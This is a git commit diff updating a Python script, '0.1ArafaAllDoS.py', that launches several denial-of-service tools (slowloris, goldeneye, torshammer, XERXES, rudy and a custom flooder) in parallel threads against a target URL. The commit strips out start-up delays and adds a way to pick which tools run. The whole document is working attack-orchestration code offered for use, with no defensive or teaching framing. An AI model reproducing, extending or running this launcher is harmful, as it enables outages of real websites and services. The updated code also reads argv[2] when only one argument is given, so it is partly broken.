d974ec032167ae65cfb15826ba6b71bbf2244a5b
0.1Arafa <86897733+0Arafa@users.noreply.github.com>
2022-12-08 14:04:42 +0300

    Update 0.1ArafaAllDoS.py

--- 0.1ArafaAllDoS.py
+++ 0.1ArafaAllDoS.py
@@ -5,7 +5,6 @@ from sys import argv
 from threading import Thread
 from termcolor import cprint
 from requests import post
-from time import sleep
 
 def banner():
 	system("clear"),cprint(r"""
@@ -34,26 +33,35 @@ def banner():
 	""","grey",attrs=["bold"])
 
 def First_Packet():
-	try:	post(argv[1])
-	except:	print("\033[00m\033[91m[-] Error, Bad URL or check your Internet Connection\033[00m"),quit()
+	try:
+		post(argv[1])
+	except:
+		print("\033[00m\033[91m[-] Error, Bad URL or check your Internet Connection\033[00m")
+		quit()
 
 def ArafaDoS():
-	cprint("[+] Starting 0.1ArafaDoS...","magenta"),sleep(1),system(f"python3 0.1ArafaDoS/0.1ArafaDoS.py {argv[1]}")
+	cprint("[+] Starting 0.1ArafaDoS...","magenta")
+	system(f"python3 0.1ArafaDoS/0.1ArafaDoS.py {argv[1]} 25")
 
 def slowloris():
-	cprint("[+] Starting slowloris...","magenta"),sleep(2),system(f"slowloris {argv[1]}")
+	cprint("[+] Starting slowloris...","magenta")
+	system(f"slowloris {argv[1]}")
 
 def goldeneye():
-	cprint("[+] Starting goldeneye...","magenta"),sleep(2),system(f"goldeneye {argv[1]}")
+	cprint("[+] Starting goldeneye...","magenta")
+	system(f"goldeneye {argv[1]}")
 
 def torshammer():
-	cprint("[+] Starting torshammer...","magenta"),sleep(3),system(f'python2 torshammer/torshammer.py -t {argv[1].replace("https://","").replace("http://","")}')
+	cprint("[+] Starting torshammer...","magenta")
+	system(f'python2 torshammer/torshammer.py -t {argv[1].replace("https://","").replace("http://","")}')
 
 def XERXES():
-	cprint("[+] Starting XERXES in 100 seconds...","magenta"),sleep(100),system(f'./XERXES/xerxes {argv[1].replace("https://","").replace("http://","")} 80')
+	cprint("[+] Starting XERXES...","magenta")
+	system(f'./XERXES/xerxes {argv[1].replace("https://","").replace("http://","")} 80')
 
 def rudy():
-	cprint("[+] Starting rudy...","magenta"),sleep(2),system(f'rudy -t {argv[1]}')
+	cprint("[+] Starting rudy...","magenta")
+	system(f'rudy -t {argv[1]}')
 
 def Main():
 	ArafaDoS_thread=Thread(target=ArafaDoS)
@@ -63,16 +71,38 @@ def Main():
 	torshammer_thread=Thread(target=torshammer)
 	XERXES_thread=Thread(target=XERXES)
 
-	ArafaDoS_thread.start()
-	slowloris_thread.start()
-	goldeneye_thread.start()
-	rudy_thread.start()
-	torshammer_thread.start()
-	XERXES_thread.start()
+	if len(argv) == 2 or "all" in argv[2].lower():
+		ArafaDoS_thread.start()
+		slowloris_thread.start()
+		goldeneye_thread.start()
+		rudy_thread.start()
+		torshammer_thread.start()
+		XERXES_thread.start()
+	if "0.1arafados" in argv[2].lower():
+		ArafaDoS_thread.start()
+	if "slowloris" in argv[2].lower():
+		slowloris_thread.start()
+	if "goldeneye" in argv[2].lower():
+		goldeneye_thread.start()
+	if "rudy" in argv[2].lower():
+		rudy_thread.start()
+	if "torshammer" in argv[2].lower():
+		torshammer_thread.start()
+	if "xerxes" in argv[2].lower():
+		XERXES_thread.start()
 
 if __name__ == "__main__":
-	if len(argv) == 2:	First_Packet(),banner(),Main()
-	else:	cprint("Usage: python3 "+argv[0]+" <Target_URL>\nExample: python3 "+argv[0]+" http://example.com ","white",attrs=["bold"])
+	if len(argv) == 2 or len(argv) == 3 and "all" in argv[2].lower() or len(argv) == 3 and "0.1arafados" in argv[2].lower() or len(argv) == 3 and "slowloris" in argv[2].lower() or len(argv) == 3 and "goldeneye" in argv[2].lower() or len(argv) == 3 and "rudy" in argv[2].lower() or len(argv) == 3 and "torshammer" in argv[2].lower() or len(argv) == 3 and "xerxes" in argv[2].lower() :
+		First_Packet()
+		banner()
+		Main()
+	else:
+		cprint("Available Tools: ","white",attrs=["bold"],end="")
+		cprint("[0.1arafados,slowloris,goldeneye,rudy,torshammer,xerxes]","green")
+		cprint("Usage          : ","white",attrs=["bold"],end="")
+		cprint("python3 "+argv[0]+" <Target_URL> <Tools> OR 'all'","green")
+		cprint("Example        : ","white",attrs=["bold"],end="")
+		cprint("python3 "+argv[0]+" http://example.com 0.1arafados,slowloris","green")
 
 #By: Abd Almoen Arafa (0.1Arafa)
 #Age: 15
